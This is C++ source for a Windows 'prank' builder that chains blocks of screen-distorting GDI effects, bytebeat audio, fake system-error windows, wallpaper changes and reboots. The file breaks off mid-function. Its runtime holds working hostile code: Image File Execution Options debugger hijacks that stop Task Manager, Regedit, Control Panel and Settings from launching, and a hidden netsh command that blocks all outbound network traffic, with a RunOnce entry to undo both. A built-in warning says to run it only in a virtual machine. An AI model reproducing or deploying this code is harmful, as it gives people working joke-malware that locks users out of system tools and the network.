#pragma execution_character_set("utf-8")
#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <commdlg.h>
#include <mmsystem.h>
#include <string>
#include <vector>
#include <cstdio>
#include <cwchar>
#include <cmath>
#include <cstdlib>
#include <algorithm>
#include <atomic>
#include <thread>
#include <map>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comdlg32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wWinMainCRTStartup")

// ============================================================
// ЦВЕТА UI
// ============================================================
namespace Colors {
    const COLORREF BG = RGB(30,30,30), BG_DARK = RGB(20,20,20);
    const COLORREF BG_PANEL = RGB(45,45,45), BG_CANVAS = RGB(25,25,25);
    const COLORREF BG_HOVER = RGB(60,60,60), ACCENT = RGB(255,107,53);
    const COLORREF ACCENT_H = RGB(255,130,80), TEXT = RGB(224,224,224);
    const COLORREF TEXT_DIM = RGB(150,150,150), BORDER = RGB(70,70,70);
    const COLORREF GRID = RGB(40,40,40), LINK = RGB(255,150,100);
    const COLORREF SLIDER_BG = RGB(60,60,60), SLIDER_FG = RGB(255,107,53);
    const COLORREF WARN = RGB(255,180,60), CHECK_ON = RGB(255,107,53);
    const COLORREF CAT_WELCOME = RGB(100,200,100), CAT_GDI = RGB(80,180,255);
    const COLORREF CAT_AUDIO = RGB(255,180,80), CAT_MSGBOX = RGB(255,100,100);
    const COLORREF CAT_LINK = RGB(180,100,255), CAT_WALLPAPER = RGB(255,200,100);
    const COLORREF CAT_REGISTRY = RGB(200,100,100), CAT_REBOOT = RGB(150,50,50);
}

// ============================================================
// БИБЛИОТЕКИ
// ============================================================
struct GdiEffect { const wchar_t* ruName; int complexity; };
GdiEffect g_gdiEffects[] = {
    { L"Screen Bend",2 },{ L"Ribbon",1 },{ L"Screen Tear",1 },{ L"Zoom Blur",2 },
    { L"Kaleidoscope",3 },{ L"Screen Rotate",2 },{ L"Water Ripple",3 },{ L"Squeeze",2 },
    { L"Tunnel",3 },{ L"Invert",1 },{ L"Grayscale",1 },{ L"Red Filter",1 },
    { L"Magenta Filter",1 },{ L"Rainbow",1 },{ L"Threshold",2 },{ L"RGB Split",1 },
    { L"Glitch Blocks",1 },{ L"Stretch Blocks",1 },{ L"Scanlines",1 },{ L"TV Noise",1 },
    { L"Matrix Rain",2 },{ L"Pixelation",1 },{ L"Shake",1 },{ L"Drip",3 },
    { L"Holes",1 },{ L"Cursor Trail",2 }
};
constexpr int kGdiCount = 26;

struct ByteTrack { const wchar_t* name; };
ByteTrack g_byteTracks[] = {
    { L"Quarknova" },{ L"Monoxide" },{ L"Synth Progression" },{ L"Ambient Low" },
    { L"Bass Drop" },{ L"Glitch Noise" },{ L"Nyan Bytebeat" },{ L"Horror Drone" },
    { L"Alarm Siren" },{ L"Digital Rain" }
};
constexpr int kByteCount = 10;

struct WpColor { const wchar_t* name; COLORREF color; };
WpColor g_wpColors[] = {
    { L"Чёрный",RGB(0,0,0) },{ L"Белый",RGB(255,255,255) },{ L"Красный",RGB(200,30,30) },
    { L"Синий",RGB(30,80,200) },{ L"Зелёный",RGB(30,160,50) },{ L"Оранжевый",RGB(255,120,30) },
    { L"Жёлтый",RGB(240,210,40) },{ L"Фиолет.",RGB(150,50,200) },{ L"Розовый",RGB(230,110,180) },
    { L"Бирюзов.",RGB(60,190,200) },{ L"Серый",RGB(100,100,100) },{ L"Тёмный",RGB(25,25,35) }
};
constexpr int kWpCount = 12;

// ============================================================
// ГЛОБАЛЫ
// ============================================================
HINSTANCE g_hInst = nullptr;
int g_language = 0;
const wchar_t* CLASS_WELCOME = L"PFWelcome";
const wchar_t* CLASS_MAIN = L"PFMain";
const wchar_t* CLASS_CREATE = L"PFCreate";
const wchar_t* CLASS_EDITOR = L"PFEditor";
const wchar_t* CLASS_EFFECTSEL = L"PFEffectSel";

enum BlockType { BT_WELCOME=0, BT_GDI, BT_BYTEBEAT, BT_MSGBOX, BT_LINK, BT_WALLPAPER, BT_REGISTRY, BT_REBOOT, BT_COUNT };

struct BlockCategory {
    BlockType type; const wchar_t* ruName; const wchar_t* enName;
    const wchar_t* icon; COLORREF color;
};
BlockCategory g_categories[BT_COUNT] = {
    { BT_WELCOME,L"Приветствие",L"Welcome",L"👋",Colors::CAT_WELCOME },
    { BT_GDI,L"GDI-эффект",L"GDI effect",L"🎨",Colors::CAT_GDI },
    { BT_BYTEBEAT,L"Bytebeat",L"Bytebeat",L"🎵",Colors::CAT_AUDIO },
    { BT_MSGBOX,L"MessageBox",L"MessageBox",L"⚠",Colors::CAT_MSGBOX },
    { BT_LINK,L"Ссылка",L"Link",L"🔗",Colors::CAT_LINK },
    { BT_WALLPAPER,L"Обои",L"Wallpaper",L"🖼",Colors::CAT_WALLPAPER },
    { BT_REGISTRY,L"Блокировка",L"Registry",L"🔒",Colors::CAT_REGISTRY },
    { BT_REBOOT,L"Ребут",L"Reboot",L"⏻",Colors::CAT_REBOOT }
};

struct Block {
    int id; BlockType type; std::wstring title; int x,y,w,h; bool selected;
    std::wstring welcomeText = L"Это пранк. Запускать только на виртуалке.";
    int gdiEffect=0, gdiDuration=10, gdiIntensity=60;
    int bbTrack=0, bbVolume=70;
    std::wstring msgText = L"Сообщение"; int msgIcon=2, msgCount=1, msgTrajectory=0, msgDelay=500;
    std::wstring linkURL = L"https://google.com"; int linkCount=1, linkDelay=2000;
    int wpType=0, wpColor=0; std::wstring wpPath;
    bool regTaskMgr=false, regRegedit=false, regControlPanel=false, regSettings=false, regInternet=false, regWarn=true;
    int rebootDelay=5;
    Block() : id(0),type(BT_WELCOME),x(0),y(0),w(220),h(70),selected(false) {}
};

struct ProjectInfo { std::wstring name, path, date; };
std::vector<ProjectInfo> g_projects;
HWND g_mainWnd = nullptr;

struct EditorState {
    std::vector<Block> blocks; int nextId=1; int selectedId=-1;
    int scrollX=0, scrollY=0; float zoom=1.0f;
    bool dragging=false; int dragBlockId=-1; int dragOffsetX=0, dragOffsetY=0;
    int expandedCategory=-1, hoveredCategory=-1;
    int activeSlider=-1; RECT sliderRects[8]={}; int sliderCount=0;
    RECT buttonRects[8]={}; int buttonCount=0;
    RECT checkboxRects[8]={}; int checkboxCount=0;
    RECT swatchRects[16]={}; int swatchCount=0;
    HWND propEdit=nullptr; int editBlockId=-1; int editField=0; RECT editRect={};
    std::wstring projectName, projectPath;
    bool modified=false;
    int hoveredBtn=-1, hoveredCheckbox=-1, hoveredSwatch=-1;
} g_editor;
HWND g_editorWnd = nullptr;

struct EffectSelState { HWND parent=nullptr; int scrollY=0, hovered=-1, selected=-1, forBlockId=-1; };
EffectSelState g_effectSel;

// Runtime state
std::atomic<bool> g_rtStop{false};
std::atomic<bool> g_rtAudioStop{false};
std::atomic<int>  g_rtVolume{70};

// ============================================================
// УТИЛИТЫ UI
// ============================================================
void FillRectC(HDC dc,const RECT& rc,COLORREF c){HBRUSH b=CreateSolidBrush(c);FillRect(dc,&rc,b);DeleteObject(b);}
void DrawTextCentered(HDC dc,const wchar_t* t,RECT rc,COLORREF c,int fs,bool b){
    SetBkMode(dc,TRANSPARENT);SetTextColor(dc,c);
    HFONT f=CreateFontW(fs,0,0,0,b?FW_BOLD:FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,0,L"Segoe UI");
    HFONT o=(HFONT)SelectObject(dc,f);DrawTextW(dc,t,-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);
    SelectObject(dc,o);DeleteObject(f);
}
void DrawTextLeft(HDC dc,const wchar_t* t,RECT rc,COLORREF c,int fs,bool b){
    SetBkMode(dc,TRANSPARENT);SetTextColor(dc,c);
    HFONT f=CreateFontW(fs,0,0,0,b?FW_BOLD:FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,0,L"Segoe UI");
    HFONT o=(HFONT)SelectObject(dc,f);DrawTextW(dc,t,-1,&rc,DT_LEFT|DT_VCENTER|DT_SINGLELINE);
    SelectObject(dc,o);DeleteObject(f);
}
void DrawCustomButton(HDC dc,const RECT& rc,const wchar_t* t,bool hov,bool accent){
    COLORREF bg=accent?(hov?Colors::ACCENT_H:Colors::ACCENT):(hov?Colors::BG_HOVER:Colors::BG_PANEL);
    FillRectC(dc,rc,bg);
    HBRUSH br=CreateSolidBrush(Colors::BORDER);FrameRect(dc,&rc,br);DeleteObject(br);
    DrawTextCentered(dc,t,rc,accent?RGB(255,255,255):Colors::TEXT,14,true);
}
void DrawSlider(HDC dc,const RECT& rc,int v,int mx,bool hov){
    int my=(rc.top+rc.bottom)/2;
    RECT tr={rc.left,my-4,rc.right,my+4};FillRectC(dc,tr,Colors::SLIDER_BG);
    int fw=(rc.right-rc.left)*v/(mx>0?mx:1);
    RECT fr={rc.left,my-4,rc.left+fw,my+4};FillRectC(dc,fr,Colors::SLIDER_FG);
    int tx=rc.left+fw,r=hov?12:10;
    HBRUSH tb=CreateSolidBrush(hov?Colors::ACCENT_H:Colors::ACCENT);
    HBRUSH o=(HBRUSH)SelectObject(dc,tb);
    HPEN op=(HPEN)SelectObject(dc,GetStockObject(NULL_PEN));
    Ellipse(dc,tx-r,my-r,tx+r,my+r);
    SelectObject(dc,o);SelectObject(dc,op);DeleteObject(tb);
}
void DrawCheckbox(HDC dc,const RECT& rc,bool ch,bool hov){
    int sz=18;
    RECT box={rc.left,rc.top+(rc.bottom-rc.top-sz)/2,rc.left+sz,rc.top+(rc.bottom-rc.top+sz)/2};
    FillRectC(dc,box,hov?Colors::BG_HOVER:Colors::BG_PANEL);
    HBRUSH br=CreateSolidBrush(Colors::BORDER);FrameRect(dc,&box,br);DeleteObject(br);
    if(ch){RECT in={box.left+3,box.top+3,box.right-3,box.bottom-3};FillRectC(dc,in,Colors::CHECK_ON);}
}

// ============================================================
// JSON
// ============================================================
std::string WideToUtf8(const std::wstring& w){
    if(w.empty())return "";
    int sz=WideCharToMultiByte(CP_UTF8,0,w.c_str(),(int)w.size(),nullptr,0,nullptr,nullptr);
    std::string o(sz,0);
    WideCharToMultiByte(CP_UTF8,0,w.c_str(),(int)w.size(),&o[0],sz,nullptr,nullptr);
    return o;
}
std::wstring Utf8ToWide(const std::string& s){
    if(s.empty())return L"";
    int sz=MultiByteToWideChar(CP_UTF8,0,s.c_str(),(int)s.size(),nullptr,0);
    std::wstring o(sz,0);
    MultiByteToWideChar(CP_UTF8,0,s.c_str(),(int)s.size(),&o[0],sz);
    return o;
}
std::string EscapeJson(const std::string& s){
    std::string o;
    for(char c:s){switch(c){case'"':o+="\\\"";break;case'\\':o+="\\\\";break;
        case'\n':o+="\\n";break;case'\r':o+="\\r";break;case'\t':o+="\\t";break;default:o+=c;}}
    return o;
}
void UnescapeJson(std::string& s){
    std::string o; o.reserve(s.size());
    for(size_t i=0;i<s.size();++i){
        if(s[i]=='\\'&&i+1<s.size()){
            switch(s[i+1]){case'"':o+='"';++i;break;case'\\':o+='\\';++i;break;
                case'n':o+='\n';++i;break;case'r':o+='\r';++i;break;case't':o+='\t';++i;break;
                default:o+=s[i];}
        } else o+=s[i];
    }
    s=o;
}

// ============================================================
// СОХРАНЕНИЕ ПРОЕКТА
// ============================================================
bool SaveProject(){
    if(g_editor.projectPath.empty())return false;
    wchar_t fp[MAX_PATH];swprintf_s(fp,L"%s\\project.pforge",g_editor.projectPath.c_str());
    std::string j="{\n  \"name\": \""+EscapeJson(WideToUtf8(g_editor.projectName))+"\",\n  \"blocks\": [\n";
    for(size_t i=0;i<g_editor.blocks.size();++i){
        Block& b=g_editor.blocks[i];
        j+="    {\n";
        j+="      \"id\": "+std::to_string(b.id)+",\n";
        j+="      \"type\": "+std::to_string((int)b.type)+",\n";
        j+="      \"x\": "+std::to_string(b.x)+",\n";
        j+="      \"y\": "+std::to_string(b.y)+",\n";
        j+="      \"welcomeText\": \""+EscapeJson(WideToUtf8(b.welcomeText))+"\",\n";
        j+="      \"gdiEffect\": "+std::to_string(b.gdiEffect)+",\n";
        j+="      \"gdiDuration\": "+std::to_string(b.gdiDuration)+",\n";
        j+="      \"gdiIntensity\": "+std::to_string(b.gdiIntensity)+",\n";
        j+="      \"bbTrack\": "+std::to_string(b.bbTrack)+",\n";
        j+="      \"bbVolume\": "+std::to_string(b.bbVolume)+",\n";
        j+="      \"msgText\": \""+EscapeJson(WideToUtf8(b.msgText))+"\",\n";
        j+="      \"msgIcon\": "+std::to_string(b.msgIcon)+",\n";
        j+="      \"msgCount\": "+std::to_string(b.msgCount)+",\n";
        j+="      \"msgTrajectory\": "+std::to_string(b.msgTrajectory)+",\n";
        j+="      \"msgDelay\": "+std::to_string(b.msgDelay)+",\n";
        j+="      \"linkURL\": \""+EscapeJson(WideToUtf8(b.linkURL))+"\",\n";
        j+="      \"linkCount\": "+std::to_string(b.linkCount)+",\n";
        j+="      \"linkDelay\": "+std::to_string(b.linkDelay)+",\n";
        j+="      \"wpType\": "+std::to_string(b.wpType)+",\n";
        j+="      \"wpColor\": "+std::to_string(b.wpColor)+",\n";
        j+="      \"wpPath\": \""+EscapeJson(WideToUtf8(b.wpPath))+"\",\n";
        j+="      \"regTaskMgr\": "+std::to_string(b.regTaskMgr?1:0)+",\n";
        j+="      \"regRegedit\": "+std::to_string(b.regRegedit?1:0)+",\n";
        j+="      \"regControlPanel\": "+std::to_string(b.regControlPanel?1:0)+",\n";
        j+="      \"regSettings\": "+std::to_string(b.regSettings?1:0)+",\n";
        j+="      \"regInternet\": "+std::to_string(b.regInternet?1:0)+",\n";
        j+="      \"regWarn\": "+std::to_string(b.regWarn?1:0)+",\n";
        j+="      \"rebootDelay\": "+std::to_string(b.rebootDelay)+"\n";
        j+="    }";
        if(i+1<g_editor.blocks.size())j+=",";
        j+="\n";
    }
    j+="  ]\n}\n";
    HANDLE f=CreateFileW(fp,GENERIC_WRITE,0,nullptr,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,nullptr);
    if(f==INVALID_HANDLE_VALUE)return false;
    DWORD wr;WriteFile(f,j.c_str(),(DWORD)j.size(),&wr,nullptr);CloseHandle(f);
    g_editor.modified=false;return true;
}

// ============================================================
// RUNTIME — bytebeat
// ============================================================
DWORD RtBytebeat(int idx,DWORD t){
    switch(idx){
        case 0: return ((t*(t>>8|t>>13)&63)+(t*(t>>11&t>>15)&127))&0xFF;
        case 1: return (((t>>10&42)*t+(t|t%255|t%257)+(t&t>>8)+((t%((t>>8|t>>16)+1))^t))&0xFF);
        case 2: return (((t>>4)^(t>>8)^(t>>12))&0xFF);
        case 3: return (((t>>12)|(t>>10))&0xFF);
        case 4: return (((t>>14)|(t*(t>>13)))&0xFF);
        case 5: return (((t^(t>>3))*(t>>8))&0xFF);
        case 6: return ((t*(t>>8&t>>11))&0xFF);
        case 7: return (((t>>4)^(t>>8)^(t>>12))&0xFF);
        case 8: return ((((t>>6)|(t>>9))&0x7F));
        case 9: return ((((t>>10)^(t>>13))*(t>>8))&0xFF);
        default: return 128;
    }
}

void RtAudioThread(int track,int durationMs){
    const int SR=8000,BUF=1024,N=4;
    WAVEFORMATEX wf={};wf.wFormatTag=WAVE_FORMAT_PCM;wf.nChannels=1;
    wf.nSamplesPerSec=SR;wf.wBitsPerSample=8;wf.nBlockAlign=1;wf.nAvgBytesPerSec=SR;
    HWAVEOUT h=nullptr;
    if(waveOutOpen(&h,WAVE_MAPPER,&wf,0,0,CALLBACK_NULL)!=MMSYSERR_NOERROR)return;
    std::vector<unsigned char> samp(N*BUF);std::vector<WAVEHDR> hdr(N);
    for(int i=0;i<N;++i){hdr[i]={};hdr[i].lpData=(LPSTR)&samp[i*BUF];hdr[i].dwBufferLength=BUF;
        waveOutPrepareHeader(h,&hdr[i],sizeof(WAVEHDR));}
    DWORD t=0;int cb=0;DWORD start=GetTickCount();
    while(!g_rtStop.load()&&(durationMs==0||(int)(GetTickCount()-start)<durationMs)){
        int g=0;while(!(hdr[cb].dwFlags&WHDR_DONE)){Sleep(2);if(++g>500)break;}
        int v=g_rtVolume.load();unsigned char* buf=(unsigned char*)hdr[cb].lpData;
        for(int i=0;i<BUF;++i){
            DWORD raw=RtBytebeat(track,t++);
            int s=(int)raw-128;s=s*v/100;if(s>127)s=127;if(s<-128)s=-128;
            buf[i]=(unsigned char)(s+128);
        }
        hdr[cb].dwFlags&=~WHDR_DONE;hdr[cb].dwBufferLength=BUF;
        waveOutWrite(h,&hdr[cb],sizeof(WAVEHDR));cb=(cb+1)%N;
    }
    waveOutReset(h);
    for(int i=0;i<N;++i)waveOutUnprepareHeader(h,&hdr[i],sizeof(WAVEHDR));
    waveOutClose(h);
}

// ============================================================
// RUNTIME — GDI-эффекты
// ============================================================
void RtEffect(int effect,int intensity,int durationMs){
    int sw=GetSystemMetrics(SM_CXSCREEN),sh=GetSystemMetrics(SM_CYSCREEN);
    HDC hs=GetDC(nullptr);
    HDC hm=CreateCompatibleDC(hs);
    HBITMAP bm=CreateCompatibleBitmap(hs,sw,sh);
    HBITMAP ob=(HBITMAP)SelectObject(hm,bm);
    BitBlt(hm,0,0,sw,sh,hs,0,0,SRCCOPY);
    DWORD start=GetTickCount();
    while(!g_rtStop.load()&&(int)(GetTickCount()-start)<durationMs){
        switch(effect){
            case 9: BitBlt(hs,0,0,sw,sh,hs,0,0,NOTSRCCOPY); break; // Invert
            case 10: { // Grayscale
                for(int y=0;y<sh;y+=4)for(int x=0;x<sw;x+=4){
                    COLORREF c=GetPixel(hs,x,y);
                    int g=(GetRValue(c)*30+GetGValue(c)*59+GetBValue(c)*11)/100;
                    SetPixel(hs,x,y,RGB(g,g,g));
                }
                break;
            }
            case 11: { // Red filter
                HDC hr=CreateCompatibleDC(hs);HBITMAP br=CreateCompatibleBitmap(hs,sw,sh);
                HBITMAP ob2=(HBITMAP)SelectObject(hr,br);
                HBRUSH b=CreateSolidBrush(RGB(200,0,0));RECT r={0,0,sw,sh};
                FillRect(hr,&r,b);DeleteObject(b);
                BLENDFUNCTION bf={AC_SRC_OVER,0,(BYTE)(intensity/2),0};
                AlphaBlend(hs,0,0,sw,sh,hr,0,0,sw,sh,bf);
                SelectObject(hr,ob2);DeleteObject(br);DeleteDC(hr);
                break;
            }
            case 12: { // Magenta
                HDC hr=CreateCompatibleDC(hs);HBITMAP br=CreateCompatibleBitmap(hs,sw,sh);
                HBITMAP ob2=(HBITMAP)SelectObject(hr,br);
                HBRUSH b=CreateSolidBrush(RGB(255,0,255));RECT r={0,0,sw,sh};
                FillRect(hr,&r,b);DeleteObject(b);
                BLENDFUNCTION bf={AC_SRC_OVER,0,(BYTE)(intensity/2),0};
                AlphaBlend(hs,0,0,sw,sh,hr,0,0,sw,sh,bf);
                SelectObject(hr,ob2);DeleteObject(br);DeleteDC(hr);
                break;
            }
            case 13: { // Rainbow
                static double hue=0;hue+=0.05;
                HDC hr=CreateCompatibleDC(hs);HBITMAP br=CreateCompatibleBitmap(hs,sw,sh);
                HBITMAP ob2=(HBITMAP)SelectObject(hr,br);
                int rr=(int)(127*(1+sin(hue)));
                int gg=(int)(127*(1+sin(hue+2.094)));
                int bb2=(int)(127*(1+sin(hue+4.188)));
                HBRUSH b=CreateSolidBrush(RGB(rr,gg,bb2));RECT r={0,0,sw,sh};
                FillRect(hr,&r,b);DeleteObject(b);
                BLENDFUNCTION bf={AC_SRC_OVER,0,(BYTE)(intensity/2),0};
                AlphaBlend(hs,0,0,sw,sh,hr,0,0,sw,sh,bf);
                SelectObject(hr,ob2);DeleteObject(br);DeleteDC(hr);
                break;
            }
            case 18: { // Scanlines
                HBRUSH bk=CreateSolidBrush(RGB(0,0,0));
                for(int y=0;y<sh;y+=4){RECT r={0,y,sw,y+2};FillRect(hs,&r,bk);}
                DeleteObject(bk);
                break;
            }
            case 19: { // TV Noise
                for(int i=0;i<30+intensity*3;++i){
                    int x=rand()%sw,y=rand()%sh,sz=2+rand()%8;
                    int v=rand()&0xFF;
                    HBRUSH b=CreateSolidBrush(RGB(v,v,v));
                    RECT r={x,y,x+sz,y+sz};FillRect(hs,&r,b);DeleteObject(b);
                }
                break;
            }
            case 16: { // Glitch blocks (XOR)
                for(int i=0;i<intensity/10+3;++i){
                    int sx=rand()%(sw-150),sy=rand()%(sh-150);
                    int w=60+rand()%200,h=40+rand()%150;
                    int dx=sx+(rand()%61)-30,dy=sy+(rand()%61)-30;
                    BitBlt(hs,dx,dy,w,h,hs,sx,sy,SRCINVERT);
                }
                break;
            }
            case 17: { // Stretch blocks
                for(int i=0;i<intensity/8+2;++i){
                    int sx=rand()%(sw-200),sy=rand()%(sh-200);
                    int w=100+rand()%200,h=80+rand()%200;
                    int dx=rand()%(sw-300),dy=rand()%(sh-300);
                    StretchBlt(hs,dx,dy,w+rand()%100,h+rand()%100,hs,sx,sy,w,h,SRCCOPY);
                }
                break;
            }
            case 21: { // Pixelation
                int blocks=200-intensity*2;if(blocks<30)blocks=30;
                HDC hSm=CreateCompatibleDC(hs);
                HBITMAP bSm=CreateCompatibleBitmap(hs,blocks,blocks*sh/sw);
                HBITMAP oS=(HBITMAP)SelectObject(hSm,bSm);
                SetStretchBltMode(hSm,COLORONCOLOR);
                StretchBlt(hSm,0,0,blocks,blocks*sh/sw,hs,0,0,sw,sh,SRCCOPY);
                SetStretchBltMode(hs,COLORONCOLOR);
                StretchBlt(hs,0,0,sw,sh,hSm,0,0,blocks,blocks*sh/sw,SRCCOPY);
                SelectObject(hSm,oS);DeleteObject(bSm);DeleteDC(hSm);
                break;
            }
            case 22: { // Shake
                int dx=(rand()%9)-4,dy=(rand()%9)-4;
                BitBlt(hs,dx,dy,sw,sh,hm,0,0,SRCCOPY);
                break;
            }
            case 15: { // RGB Split
                int off=3+rand()%10;
                BitBlt(hs,-off,0,sw,sh,hm,0,0,SRCINVERT);
                BitBlt(hs,off,0,sw,sh,hm,0,0,SRCINVERT);
                break;
            }
            case 2: { // Screen Tear
                const int STRIPS=40;int stripH=sh/STRIPS;
                for(int i=0;i<STRIPS;++i){
                    int y=i*stripH,off=(rand()%41)-20;
                    BitBlt(hs,off,y,sw,stripH,hm,0,y,SRCCOPY);
                }
                break;
            }
            case 1: { // Ribbon
                const int STRIPS=50;int stripH=sh/STRIPS;
                for(int i=0;i<STRIPS;++i){
                    int y=i*stripH,off=(rand()%41)-20;
                    BitBlt(hs,off,y,sw,stripH,hm,0,y,SRCCOPY);
                }
                break;
            }
            default: { // Простая заглушка — лёгкая тряска
                int dx=(rand()%5)-2,dy=(rand()%5)-2;
                BitBlt(hs,dx,dy,sw,sh,hm,0,0,SRCCOPY);
            }
        }
        Sleep(30);
    }
    BitBlt(hs,0,0,sw,sh,hm,0,0,SRCCOPY);
    SelectObject(hm,ob);DeleteObject(bm);DeleteDC(hm);ReleaseDC(nullptr,hs);
}

// ============================================================
// RUNTIME — MessageBox окна с траекториями
// ============================================================
LRESULT CALLBACK RtErrProc(HWND h,UINT m,WPARAM w,LPARAM l){
    if(m==WM_ERASEBKGND)return 1;
    if(m==WM_PAINT){
        PAINTSTRUCT ps;HDC dc=BeginPaint(h,&ps);
        RECT rc;GetClientRect(h,&rc);
        HBRUSH bg=CreateSolidBrush(RGB(255,255,200));FillRect(dc,&rc,bg);DeleteObject(bg);
        HBRUSH fr=CreateSolidBrush(RGB(0,0,0));FrameRect(dc,&rc,fr);DeleteObject(fr);
        HICON ic=LoadIconW(nullptr,IDI_ERROR);DrawIconEx(dc,12,12,ic,32,32,0,nullptr,DI_NORMAL);
        int idx=(int)GetWindowLongPtrW(h,GWLP_USERDATA);
        SetBkMode(dc,TRANSPARENT);SetTextColor(dc,RGB(0,0,0));
        HFONT f=CreateFontW(18,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,0,L"Segoe UI");
        HFONT o=(HFONT)SelectObject(dc,f);
        RECT tr={55,20,rc.right-10,rc.bottom-10};
        DrawTextW(dc,L"Ошибка системы",-1,&tr,DT_LEFT|DT_VCENTER|DT_SINGLELINE);
        SelectObject(dc,o);DeleteObject(f);
        EndPaint(h,&ps);return 0;
    }
    return DefWindowProcW(h,m,w,l);
}

// ============================================================
// RUNTIME — Основной поток
// ============================================================
struct RtBlock {
    int type;
    int gdiEffect,gdiDuration,gdiIntensity;
    int bbTrack,bbVolume;
    std::wstring msgText;int msgIcon,msgCount,msgTrajectory,msgDelay;
    std::wstring linkURL;int linkCount,linkDelay;
    int wpType,wpColor;std::wstring wpPath;
    bool regTM,regRE,regCP,regSS,regIN,regWarn;
    int rebootDelay;
    std::wstring welcomeText;
};

// Простой парсер JSON (только для нашего формата)
std::vector<RtBlock> ParseRtJson(const std::string& j){
    std::vector<RtBlock> out;
    size_t pos=0;
    while((pos=j.find("{",pos))!=std::string::npos){
        size_t end=j.find("}",pos);
        if(end==std::string::npos)break;
        std::string obj=j.substr(pos,end-pos+1);
        pos=end+1;
        if(obj.find("\"id\"")==std::string::npos)continue;
        RtBlock b={};
        auto getI=[&](const char* key,int def)->int{
            std::string k="\""+std::string(key)+"\":";size_t p=obj.find(k);
            if(p==std::string::npos)return def;p+=k.size();
            while(p<obj.size()&&(obj[p]==' '||obj[p]=='\t'))++p;
            return atoi(obj.c_str()+p);
        };
        auto getS=[&](const char* key)->std::wstring{
            std::string k="\""+std::string(key)+"\": \"";size_t p=obj.find(k);
            if(p==std::string::npos)return L"";p+=k.size();
            size_t e=obj.find("\"",p);
            if(e==std::string::npos)return L"";
            std::string s=obj.substr(p,e-p);UnescapeJson(s);
            return Utf8ToWide(s);
        };
        b.type=getI("type",0);
        b.gdiEffect=getI("gdiEffect",0);b.gdiDuration=getI("gdiDuration",10);b.gdiIntensity=getI("gdiIntensity",60);
        b.bbTrack=getI("bbTrack",0);b.bbVolume=getI("bbVolume",70);
        b.msgText=getS("msgText");b.msgIcon=getI("msgIcon",2);b.msgCount=getI("msgCount",1);
        b.msgTrajectory=getI("msgTrajectory",0);b.msgDelay=getI("msgDelay",500);
        b.linkURL=getS("linkURL");b.linkCount=getI("linkCount",1);b.linkDelay=getI("linkDelay",2000);
        b.wpType=getI("wpType",0);b.wpColor=getI("wpColor",0);b.wpPath=getS("wpPath");
        b.regTM=getI("regTaskMgr",0);b.regRE=getI("regRegedit",0);b.regCP=getI("regControlPanel",0);
        b.regSS=getI("regSettings",0);b.regIN=getI("regInternet",0);b.regWarn=getI("regWarn",1);
        b.rebootDelay=getI("rebootDelay",5);
        b.welcomeText=getS("welcomeText");
        out.push_back(b);
    }
    return out;
}

// Реестр
void RtBlockIFEO(const wchar_t* exe){
    wchar_t p[512];swprintf_s(p,L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",exe);
    HKEY h;if(RegCreateKeyExW(HKEY_LOCAL_MACHINE,p,0,nullptr,0,KEY_SET_VALUE,nullptr,&h,nullptr)==ERROR_SUCCESS){
        const wchar_t* d=L"notepad.exe C:\\Windows\\help_me.txt";
        RegSetValueExW(h,L"Debugger",0,REG_SZ,(const BYTE*)d,(DWORD)((wcslen(d)+1)*sizeof(wchar_t)));
        RegCloseKey(h);
    }
}
void RtSetupIFEO(const RtBlock& b){
    if(b.regTM)RtBlockIFEO(L"taskmgr.exe");
    if(b.regRE)RtBlockIFEO(L"regedit.exe");
    if(b.regCP)RtBlockIFEO(L"control.exe");
    if(b.regSS)RtBlockIFEO(L"SystemSettings.exe");
    if(b.regIN){
        STARTUPINFOW si={};si.cb=sizeof(si);PROCESS_INFORMATION pi={};
        wchar_t cmd[]=L"cmd.exe /c netsh advfirewall set allprofiles state on & netsh advfirewall firewall add rule name=\"PFBlock\" dir=out action=block";
        if(CreateProcessW(nullptr,cmd,nullptr,nullptr,FALSE,CREATE_NO_WINDOW,nullptr,nullptr,&si,&pi)){
            WaitForSingleObject(pi.hProcess,5000);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    }
    const wchar_t* restore=L"cmd.exe /c "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe\" /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe\" /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SystemSettings.exe\" /f & "
        L"netsh advfirewall firewall delete rule name=\"PFBlock\"";
    HKEY h;if(RegCreateKeyExW(HKEY_LOCAL_MACHINE,L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        0,nullptr,0,KEY_SET_VALUE,nullptr,&h,nullptr)==ERROR_SUCCESS){
        RegSetValueExW(h,L"PFRestore",0,REG_SZ,(const BYTE*)restore,(DWORD)((wcslen(restore)+1)*sizeof(wchar_t)));
        RegCloseKey(h);
    }
}

void RtShowWelcome(const RtBlock& b){
    MessageBoxW(nullptr,b.welcomeText.c_str(),L"Предупреждение",MB_OK|MB_ICONWARNING|MB_TOPMOST);
}

void RtWallpaper(const RtBlock& b){
    if(b.wpType==0){
        int idx=b.wpColor;if(idx<0||idx>=kWpCount)idx=0;
        COLORREF c=g_wpColors[idx].color;
        wchar_t tmp[MAX_PATH];
        GetTempPathW(MAX_PATH,tmp);
        wcscat_s(tmp,L"pf_wp.bmp");
        HDC hs=GetDC(nullptr);
